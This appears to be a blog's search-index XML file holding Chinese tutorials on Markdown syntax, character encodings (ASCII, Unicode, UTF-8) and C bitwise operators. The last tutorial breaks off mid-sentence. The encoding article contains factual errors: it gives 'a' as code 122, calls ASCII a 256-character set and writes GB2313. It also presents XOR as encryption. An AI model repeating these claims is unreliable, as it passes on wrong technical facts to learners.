`&amp;mdash;`.</code></pre><p>以产生：</p><pre><code>&lt;p&gt;&lt;code&gt;&amp;amp;#8212;&lt;/code&gt; is the decimal-encodedequivalent of &lt;code&gt;&amp;amp;mdash;&lt;/code&gt;.&lt;/p&gt;</code></pre><p>图片</p><p>很明显地，要在纯文字应用中设计一个「自然」的语法来插入图片是有一定难度的。</p><p>Markdown 使用一种和链接很相似的语法来标记图片，同样也允许两种样式： <em>行内式</em>和<em>参考式</em>。</p><p>行内式的图片语法看起来像是：</p><pre><code>![Alt text](/path/to/img.jpg)![Alt text](/path/to/img.jpg &quot;Optional title&quot;)</code></pre><p>详细叙述如下：</p><ul><li><p>一个惊叹号 <code>!</code></p></li><li><p>接着一个方括号，里面放上图片的替代文字</p></li><li><p>接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上 选择性的 ‘title’ 文字。<br>参考式的图片语法则长得像这样：</p><p>  ![Alt text][id]<br>「id」是图片参考的名称，图片参考的定义方式则和连结参考一样：</p><p>  [id]: url/to/image  “Optional title attribute”<br>到目前为止， Markdown 还没有办法指定图片的宽高，如果你需要的话，你可以使用普通的 <code>&lt;img&gt;</code> 标签。</p></li></ul><hr><hr><h1 id="其它"><a href="#其它" class="headerlink" title="其它 "></a>其它 <span id="4"></h1><h2 id="自动链接"><a href="#自动链接" class="headerlink" title="自动链接 "></a>自动链接 <span id="4.1"></h2><p>Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用尖括号包起来， Markdown 就会自动把它转成链接。一般网址的链接文字就和链接地址一样，例如：</p><pre><code>&lt;http://example.com/&gt;</code></pre><p>Markdown 会转为：</p><pre><code>&lt;a href=&quot;http://example.com/&quot;&gt;http://example.com/&lt;/a&gt;</code></pre><p>邮址的自动链接也很类似，只是 Markdown 会先做一个编码转换的过程，把文字字符转成 16 进位码的 HTML 实体，这样的格式可以糊弄一些不好的邮址收集机器人，例如：</p><pre><code>&lt;address@example.com&gt;</code></pre><p>Markdown 会转成：</p><pre><code>&lt;a href=&quot;&amp;#x6D;&amp;#x61;i&amp;#x6C;&amp;#x74;&amp;#x6F;:&amp;#x61;&amp;#x64;&amp;#x64;&amp;#x72;&amp;#x65;&amp;#115;&amp;#115;&amp;#64;&amp;#101;&amp;#120;&amp;#x61;&amp;#109;&amp;#x70;&amp;#x6C;e&amp;#x2E;&amp;#99;&amp;#111;&amp;#109;&quot;&gt;&amp;#x61;&amp;#x64;&amp;#x64;&amp;#x72;&amp;#x65;&amp;#115;&amp;#115;&amp;#64;&amp;#101;&amp;#120;&amp;#x61;&amp;#109;&amp;#x70;&amp;#x6C;e&amp;#x2E;&amp;#99;&amp;#111;&amp;#109;&lt;/a&gt;</code></pre><p>在浏览器里面，这段字串（其实是 <code>&lt;a href=&quot;mailto:address@example.com&quot;&gt;address@example.com&lt;/a&gt;</code>）会变成一个可以点击的「<a href="mailto:&#x61;&#100;&#x64;&#x72;&#x65;&#115;&#x73;&#64;&#101;&#120;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#46;&#x63;&#x6f;&#x6d;">&#x61;&#100;&#x64;&#x72;&#x65;&#115;&#x73;&#64;&#101;&#120;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#46;&#x63;&#x6f;&#x6d;</a>」链接。</p><p>（这种作法虽然可以糊弄不少的机器人，但并不能全部挡下来，不过总比什么都不做好些。不管怎样，公开你的信箱终究会引来广告信件的。）</p><h2 id="反斜杠"><a href="#反斜杠" class="headerlink" title="反斜杠 "></a>反斜杠 <span id="4.2"></h2><p>Markdown 可以利用反斜杠来插入一些在语法中有其它意义的符号，例如：如果你想要用星号加在文字旁边的方式来做出强调效果（但不用 <code>&lt;em&gt;</code> 标签），你可以在星号的前面加上反斜杠：</p><pre><code>\*literal asterisks\*</code></pre><p>Markdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：</p><pre><code>\   反斜线`   反引号*   星号_   底线&#123;&#125;  花括号[]  方括号()  括弧#   井字号+   加号-   减号.   英文句点!   惊叹号</code></pre><hr><h1 id="返回顶部"><a href="#返回顶部" class="headerlink" title="返回顶部"></a><strong>返回<a href="#home">顶部</a></strong></h1><hr>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown 简明教程</title>
      <link href="/2024/09/27/bian-cheng/markdown-jian-ming-jiao-cheng/"/>
      <url>/2024/09/27/bian-cheng/markdown-jian-ming-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="Markdown-及扩展"><a href="#Markdown-及扩展" class="headerlink" title="Markdown 及扩展"></a>Markdown 及扩展</h2><blockquote><p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成格式丰富的HTML页面。    —— <a href="https://zh.wikipedia.org/wiki/Markdown" target="_blank"> [ 维基百科 ]</p></blockquote><p>使用简单的符号标识不同的标题，将某些文字标记为<strong>粗体</strong>或者<em>斜体</em>，创建一个<a href="http://www.csdn.net/">链接</a>等，详细语法参考帮助？。</p><p>本编辑器支持 <strong>Markdown Extra</strong> , 　扩展了很多好用的功能。具体请参考<a href="https://github.com/jmcmanus/pagedown-extra" title="Pagedown Extra">Github</a>.  </p><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><p><strong>Markdown　Extra</strong>　表格语法：</p><table><thead><tr><th>项目</th><th>价格</th></tr></thead><tbody><tr><td>Computer</td><td>$1600</td></tr><tr><td>Phone</td><td>$12</td></tr><tr><td>Pipe</td><td>$1</td></tr></tbody></table><p>写法：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token table"><span class="token table-header-row"><span class="token table-header important">项目     </span><span class="token punctuation">|</span><span class="token table-header important"> 价格</span></span><span class="token table-line"><span class="token punctuation">---------</span><span class="token punctuation">|</span><span class="token punctuation">------</span></span><span class="token table-data-rows"><span class="token table-data">Computer </span><span class="token punctuation">|</span><span class="token table-data"> $1600</span><span class="token table-data">Phone    </span><span class="token punctuation">|</span><span class="token table-data"> $12</span><span class="token table-data">Pipe     </span><span class="token punctuation">|</span><span class="token table-data"> $1</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用冒号来定义对齐方式：</p><table><thead><tr><th align="left">项目</th><th align="right">价格</th><th align="center">数量</th></tr></thead><tbody><tr><td align="left">Computer</td><td align="right">1600 元</td><td align="center">5</td></tr><tr><td align="left">Phone</td><td align="right">12 元</td><td align="center">12</td></tr><tr><td align="left">Pipe</td><td align="right">1 元</td><td align="center">234</td></tr></tbody></table><p>写法：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token table"><span class="token table-header-row"><span class="token punctuation">|</span><span class="token table-header important"> 项目      </span><span class="token punctuation">|</span><span class="token table-header important">   价格  </span><span class="token punctuation">|</span><span class="token table-header important">  数量 </span><span class="token punctuation">|</span></span><span class="token table-line"><span class="token punctuation">|</span><span class="token punctuation">:---------</span> <span class="token punctuation">|</span><span class="token punctuation">--------:</span><span class="token punctuation">|</span><span class="token punctuation">:----:</span><span class="token punctuation">|</span></span><span class="token table-data-rows"><span class="token punctuation">|</span><span class="token table-data"> Computer  </span><span class="token punctuation">|</span><span class="token table-data"> 1600 元 </span><span class="token punctuation">|</span><span class="token table-data">  5   </span><span class="token punctuation">|</span><span class="token punctuation">|</span><span class="token table-data"> Phone     </span><span class="token punctuation">|</span><span class="token table-data">   12 元 </span><span class="token punctuation">|</span><span class="token table-data">  12  </span><span class="token punctuation">|</span><span class="token punctuation">|</span><span class="token table-data"> Pipe      </span><span class="token punctuation">|</span><span class="token table-data">    1 元 </span><span class="token punctuation">|</span><span class="token table-data"> 234  </span><span class="token punctuation">|</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h3><blockquote><p>格式一：</p></blockquote><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token url"><span class="token operator">!</span>[<span class="token content">picture-name</span>](<span class="token url">http://xxx.com/xxx.png</span>)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>格式二：(方便设置图片尺寸)</p></blockquote><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xxx.com/xxx.png<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>download-failed<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>XXXpx<span class="token punctuation">"</span></span>  <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>XXXpx<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h3><p><strong>Markdown Extra</strong> 定义列表语法：</p><ul><li>项目１</li><li>项目２<ul><li>定义 A<ul><li>定义 a</li></ul></li><li>定义 B</li></ul></li></ul><dl><dt>项目３</dt><dd>定义 C</dd></dl><p>:   定义 D</p><pre><code>&gt; 定义 E</code></pre><p>写法：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token list punctuation">-</span> 项目１<span class="token list punctuation">-</span> 项目２  <span class="token list punctuation">-</span> 定义 A    <span class="token list punctuation">-</span> 定义 a  <span class="token list punctuation">-</span> 定义 B项目３:   定义 C:   定义 D<span class="token code keyword">> 定义 E</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><p>代码块语法遵循标准markdown代码，例如：</p><blockquote><p>python:</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@requires_authorization</span><span class="token keyword">def</span> <span class="token function">somefunc</span><span class="token punctuation">(</span>param1<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> param2<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''A docstring'''</span>    <span class="token keyword">if</span> param1 <span class="token operator">></span> param2<span class="token punctuation">:</span> <span class="token comment"># interesting</span>        <span class="token keyword">print</span> <span class="token string">'Greater'</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>param2 <span class="token operator">-</span> param1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token boolean">None</span><span class="token keyword">class</span> <span class="token class-name">SomeClass</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token operator">>></span><span class="token operator">></span> message <span class="token operator">=</span> <span class="token triple-quoted-string string">'''interpreter... prompt'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>c语言:</p></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h3><p>生成一个脚注[^footnote].<br>  [^footnote]: 这里是 <strong>脚注</strong> 的 <em>内容</em>.</p><p>写法：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">生成一个脚注[^footnote].  <span class="token url-reference url"><span class="token punctuation">[</span><span class="token variable">^footnote</span><span class="token punctuation">]</span><span class="token punctuation">:</span> 这里是</span> <span class="token bold"><span class="token punctuation">**</span><span class="token content">脚注</span><span class="token punctuation">**</span></span> 的 <span class="token italic"><span class="token punctuation">*</span><span class="token content">内容</span><span class="token punctuation">*</span></span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h3><p>使用 MathJax 渲染 <em>LaTex</em> 数学公式，详见 <a href="http://math.stackexchange.com/">math.stackexchange.com</a>.</p><h4 id="行内公式"><a href="#行内公式" class="headerlink" title="行内公式"></a>行内公式</h4><p>数学公式为：$ \Gamma(n) = (n-1)!\quad\forall n\in\mathbb N $。</p><p>写法：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">数学公式为：$ \Gamma(n) = (n-1)!\quad\forall n\in\mathbb N $。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="块级公式："><a href="#块级公式：" class="headerlink" title="块级公式："></a>块级公式：</h4><p>$$ x = \dfrac{-b \pm \sqrt{b^2 - 4ac}}{2a} $$</p><p>写法：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">$$ x = \dfrac&#123;-b \pm \sqrt&#123;b^2 - 4ac&#125;&#125;&#123;2a&#125; $$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更多LaTex语法请参考 <a href="http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference">这里</a>.</p><h2 id="浏览器兼容"><a href="#浏览器兼容" class="headerlink" title="浏览器兼容"></a>浏览器兼容</h2><ol><li>目前，本编辑器对 <strong>Chrome</strong> 浏览器支持最为完整。建议大家使用较新版本的 Chrome。</li><li><strong>IE9</strong> 以下不支持</li><li><strong>IE9，10，11</strong> 存在以下问题<ol><li>不支持离线功能</li><li>IE9 不支持文件导入导出</li><li>IE10 不支持拖拽文件导入</li></ol></li></ol><h2 id="常用-Markdown-编辑器推荐"><a href="#常用-Markdown-编辑器推荐" class="headerlink" title="常用 Markdown 编辑器推荐"></a>常用 Markdown 编辑器推荐</h2><ol><li><p><strong>Markdownpad</strong>： 详情请点击 <a href="http://markdownpad.com/">官网</a>。<br>（貌似专业版需要收取一定dollars$，需要序列号自行baidu。）</p></li><li><p><strong>Markpad</strong>：详情前往 <a href="http://markpad.fluid.impa.br/">官网</a>。<br>（推荐使用，Microsoft Store也有，完全免费，支持及时效果浏览。）</p></li><li><p><strong>CSDN博客编辑器</strong>：CSDN网站内置编辑器。（这篇文件就是这样写出来的-_-)</p></li><li><p><strong>Harropad</strong>: <a href="http://pad.haroopress.com/user.html">官网</a></p></li><li><p><strong>Retext</strong>: 简单强大的文本编辑器，可控制输出格式：pdf, html等，仅支持Linux（推荐）.<a href="https://github.com/retext-project/retext">下载</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UTF-8, ASCII, Unicode 的介绍与区分</title>
      <link href="/2024/09/27/bian-cheng/utf-8-ascii-unicode-de-jie-shao-yu-qu-fen/"/>
      <url>/2024/09/27/bian-cheng/utf-8-ascii-unicode-de-jie-shao-yu-qu-fen/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>人类能通过肉眼识别文字和字符，并能通过知识了解他们的含义，但是计算机内部不论存储还是控制，都是通过二进制码实现，因为二进制的 <code>0</code>, <code>1</code> 刚好对应基础电路中的<strong>开</strong>和<strong>关</strong>，然后组合进行复杂的系统控制；</p><p>将人类识别的字符转换成计算机识别的二进制数据的过程，叫做<strong>编码</strong>，顾名思义，编程二进制数字码，如 <code>0101101100011001</code>这样的；相反，就叫做<strong>解码</strong>，把二进制码解释为字符；</p><h1 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h1><p>首先ASCII全称(American Standard Code for Information Interchange，美国信息交换标准代码)，是一个<strong>字符集</strong>，顾名思义，很多字符的集合；</p><p>像前面提到的，人类与计算机语言不通，一个识别字符，一个识别二进制，所以<strong>ASCII</strong>就充当了这样一个<strong>翻译官</strong>，其内容是编码与字符的映射，即一个字符只对应一个固定的编码，例如字符 <code>A</code> 的编码为 <code>65</code>，字符 <code>a</code> 的编码为 <code>122</code>；当然这个编码是<strong>十进制</strong>的，计算机内部把十进制转换成二进制就能供底层使用了；</p><p>另外需要知道的是，一字节(1 Byte)等于八比特位(8 bit)，8 bit就是这样的：<code>01010101</code>，八位二进制的所有不同表示一共 <strong>2^8 = 256</strong> 个，而且一般都是从 <strong>0</strong> 开始数，所以表示的十进制数的范围就是 <strong>0 - 255</strong>，这也是ASCII编码映射字符数的范围，包含大小写字母和一些其他常用的符号；</p><h1 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h1><p>看完上面肯定就会疑惑ASCII总共才表示256个字符，怎么处理当今世界巨大的信息量的，由于这个字符集最初是老外发明的，表示所有字母和一些字符对他们当时来说可能很足够了，但是先进计算机遍布全球大部分地方，汉语、韩语、日语、阿拉伯语等语言数不过来，所以ASCII明显不够用了；虽然中国之前也制定了是和中文的编码字符集叫 <strong>GB2313</strong> 等系列；</p><p>因此，便顺应时代需要产生了一种更庞大的字符集叫 <strong>Unicode</strong>，有时也叫<strong>万国码</strong>，顾名思义，几乎表示了世界上所有语言的字符，可以理解为 <code>Unique code</code>，独一无二的的编码；</p><p>目前Unicode的编码范围达到了<strong>21位</strong>，即 <code>0x0000 - 0x10ffff</code> 的范围，二进制为 <code>1 0000 1111 1111 1111 1111</code>，刚好21位；十进制表示为 <code>1114111</code>，就是一百万多个字符，已经相当多了；</p><p>如果要使用UNIcode，以在 <strong>HTML</strong> 中为例，假如知道一个字符的Unicode码是 <code>0x0394</code>,那么就在标签中添加代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token entity" title="&#x0394;">&amp;#x0394;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>放在标签中就是：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">></span></span>这个Unicode码对应的字符是：<span class="token entity" title="&#x0394;">&amp;#x0394;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果是这样：</p><blockquote><h5>这个Unicode码对应的字符是：&#x0394;</h5></blockquote><p>其实那个Unicode编码就是对应的大小希腊字母德尔塔，数学或物理中经常用到的字符；</p><p>也可以用 JavaScript 来遍历一部分Unicode与字符的对应关系：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0x0000</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0x00ff</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">': &amp;#x'</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">';&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>页面就会出现前256个字符及其Unicode码；</p><h1 id="UTF-8-UTF-16-UTF-32"><a href="#UTF-8-UTF-16-UTF-32" class="headerlink" title="UTF-8, UTF-16, UTF-32"></a>UTF-8, UTF-16, UTF-32</h1><p>首先UTF全称(Unicode Transformation Format)，所以它是一种针对前面提到的Unicode的<strong>编码格式</strong>，常见的格式就是 <strong>UTF-8</strong>，还有 <code>UTF-16</code>, <code>UTF-32</code>；</p><p>UTF-8 其中的 <code>8</code> 表示的是 <code>8 bit</code>，即Unicode中每8位表示一个字符，UTF-16 和 UTF-32 类似，因为Unicode最多才21位，32位大于21位，所以 UTF-32 的格式就可以表示所有字符对应的Unicode码了，但是呢，32位也就是<strong>4字节</strong>，让每个字符都占用4字节太费空间了，所以出现了<strong>UTF-8</strong>和<strong>UTF-16</strong>;</p><p>UTF-8 定义 <code>0 - 7 bit</code> 的 Unicode 用一字节表示，这里就与<strong>ASCII</strong>一样了，<code>8 - 11 bit</code> 用两字节表示，<code>12 - 16 bit</code> 用三字节表示，<code>17 - 21 bit</code> 用四字节表示; </p><p>UTF-8 编码规则如下：</p><style>table th, table td {    border: 2px solid black;}</style><table><thead><tr><th align="center">Unicode</th><th align="center">bit</th><th align="left">UTF-8</th><th align="center">byte</th></tr></thead><tbody><tr><td align="center">0x0000 - 0x007f</td><td align="center">0 - 7</td><td align="left">0XXX XXXX</td><td align="center">1</td></tr><tr><td align="center">0x0080 - 0x07ff</td><td align="center">8 - 11</td><td align="left">110X XXXX 10XX XXXX</td><td align="center">2</td></tr><tr><td align="center">0x0800 - 0xffff</td><td align="center">12 - 16</td><td align="left">1110 XXXX 10XX XXXX 10XX XXXX</td><td align="center">3</td></tr><tr><td align="center">0x1 0000 - 0x1f ffff</td><td align="center">17 - 21</td><td align="left">1111 0XXX 10XX XXXX 10XX XXXX 10XX XXXX</td><td align="center">4</td></tr></tbody></table><p>规律是：</p><ul><li>每个字节中不足8位的，高位(左边)先用0补上，比如 <code>0XXXX XXXX</code>；</li><li>超过两字节表示的UTF-8，第一个字节高位添加两个 <code>1</code> 和一个 <code>0</code>，后面的字节高位添加 <code>10</code>；</li><li>三、四字节同理，几个字节高位就添几个 <code>1</code> 再加上一个 <code>0</code>，其余字节高位添 <code>10</code>；</li></ul><p>可以看出 UTF-8 这种针对不同位数使用不同字节数编码的方式有效的利用了空间，避免了一些浪费，当然，事物都有利弊，空间降下去，时间也就升上去了；</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> utf-8 ascii unicode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>位运算符与位运算</title>
      <link href="/2024/09/27/bian-cheng/wei-yun-suan-fu-yu-wei-yun-suan/"/>
      <url>/2024/09/27/bian-cheng/wei-yun-suan-fu-yu-wei-yun-suan/</url>
      
        <content type="html"><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录 "></a>目录 <span id="home"></h1><ul><li><a href="#1">概述</a></li><li><a href="#2">按位与</a></li><li><a href="#3">按位或</a></li><li><a href="#4">按位异或</a><ul><li><a href="#4.1">简单应用</a><ul><li><a href="#4.1.1">交换变量值</a></li><li><a href="#4.1.2">简单加密</a></li></ul></li></ul></li><li><a href="#5">按位取反</a></li><li><a href="#6">移位运算</a><ul><li><a href="#6.1">左移位</a></li><li><a href="#6.2">右移位</a></li></ul></li><li><a href="#7">复合赋值符</a></li></ul><h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述 "></a>一、概述 <span id="1"></h1><p>程序中的所有数在计算机内存中都是以二进制的形式储存的。除了常见的<strong>算术运算符</strong>：<code>+ - * / %</code>，还有<strong>位运算</strong>：<code>&amp; | ^ ~ &gt;&gt; &lt;&lt;</code>，就是直接对整数在内存中的二进制位进行操作。接下来以C语言为例介绍，其它语言大同小异。</p><h1 id="二、按位与（-amp-）"><a href="#二、按位与（-amp-）" class="headerlink" title="二、按位与（&amp;）"></a>二、按位与（&amp;）<span id="2"></h1><p>又叫 <code>and</code> 运算，用符号 <code>&amp;</code> 表示，计算方式如下：</p><p><code>1 &amp; 1 = 1</code> , <code>0 &amp; 1 = 0</code> , <code> 0 &amp; 0 = 0</code></p><p>布尔类型中，<code>1</code> 表示真，<code>0</code> 表示假，所以可以用高中数学那句话来记：**<code>同真为真，一假为假</code>**。</p><p>举个例子：<code>3 &amp; 5 = 1</code> ，运算过程如下：</p><pre>   0 1 1   ---> 3 & 1 0 1   ---> 5  --------   0 0 1   ---> 1</pre><h1 id="三、按位或-（-）"><a href="#三、按位或-（-）" class="headerlink" title="三、按位或 （|）"></a>三、按位或 （|）<span id="3"></h1><p>又叫 <code>or</code> 运算，用符号 <code>|</code> 表示，运算方式：</p><p><code>1 | 1 = 1</code> , <code>1 | 0 = 1</code> , <code>0 | 0 = 0</code></p><p>记为：**<code>一真为真，同假为假</code>**</p><p>举例：<code>3 | 5 = 7</code> , 运算过程：</p><pre>   0 1 1   ---> 3 | 1 0 1   ---> 5 --------   1 1 1   ---> 7</pre><h1 id="四、按位异或（-）"><a href="#四、按位异或（-）" class="headerlink" title="四、按位异或（^）"></a>四、按位异或（^）<span id="4"></h1><p>又叫 <code>xor</code> 运算，用符号 <code>^</code> 表示，注意这里不是数学表达里面的<strong>次方</strong>的意思，运算方式：</p><p><code>1 ^ 1 = 0</code> , <code> 1 ^ 0 = 1</code> , <code>0 ^ 0 = 0</code></p><p>这种运算也较为特殊，记为：**<code>同为假，异为真</code>**<br>举例：<code>3 ^ 5 = 6</code> , 运算过程：</p><pre>   0 1 1    ---> 3 ^ 1 0 1    ---> 5 ---------   1 1 0    ---> 6</pre><h2 id="简单应用"><a href="#简单应用" class="headerlink" title="简单应用 "></a>简单应用 <span id="4.1"></h2><h3 id="1、交换变量值"><a href="#1、交换变量值" class="headerlink" title="1、交换变量值 "></a>1、交换变量值 <span id="4.1.1"></h3><p>异或运算有如下特性：</p><p><code>a ^ b ^a = b</code> , <code>a ^ b ^ b =a</code></p><p>因此可以用于程序中的变量值交换，C语言中，我们可能经常这样交换变量值：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">int</span> temp<span class="token punctuation">;</span> <span class="token comment">/*定义一个临时变量用于交换方便*/</span>temp <span class="token operator">=</span> a<span class="token punctuation">;</span>a <span class="token operator">=</span> b<span class="token punctuation">;</span>b <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d, b = %d"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/*输出结果为：a = 5, b = 3 实现了变量值的交换*/</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是以后我们可以这样实现：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>a <span class="token operator">^=</span> b<span class="token punctuation">;</span> <span class="token comment">/*等同于：a = a ^ b 之后会讲*/</span>b <span class="token operator">=</span> a <span class="token operator">^</span> b<span class="token punctuation">;</span> <span class="token comment">/*这时 a ^ b 等于 原来 a 的值*/</span>a <span class="token operator">^=</span> b<span class="token punctuation">;</span> <span class="token comment">/*a = a ^ b*/</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a = %d, b = %d"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>a, b 为负数时同样适用，但位运算只适用于整型，浮点数不可用</strong></p></blockquote><h3 id="2、简单加密"><a href="#2、简单加密" class="headerlink" title="2、简单加密 "></a>2、简单加密 <span id="4.1.2"></h3><p>例如，你想传输一条信息给Ta，信息为：<code>5201314</code> ，密码为：<code>1998</code> ，使用如下代码加密：</p><pre><code>5201314 ^ 1998</code></pre><p>结果为 <code>5200492</code>，想要查看原信息，使用密码查看：</p><pre><code>5200492 ^ 1998</code></pre><p>这样就生成了原数字：<code>5201314</code>.</p><h1 id="五、按位取反（-）"><a href="#五、按位取反（-）" class="headerlink" title="五、按位取反（~）"></a>五、按位取反（~）<span id="5"></h1><p>又叫 <code>not</code> 运算，即将二进制位中 <code>0</code> 和 <code>1</code> 全部取反，运算方式为：</p><p><code>~ 1 = 0</code> , <code>~ 0 = 1</code></p><p>记为：**<code>0 变 1，1 变 0</code>**</p><p>举例：<code>~5 = -6</code>, 运算过程：</p><pre> ~ 00000000 00000000 00000000 00000101   ---> 5 ---------------------------------------   11111111 11111111 11111111 11111010   ---> -6</pre><blockquote><p><strong>注意变量如果定义是无符号短整型 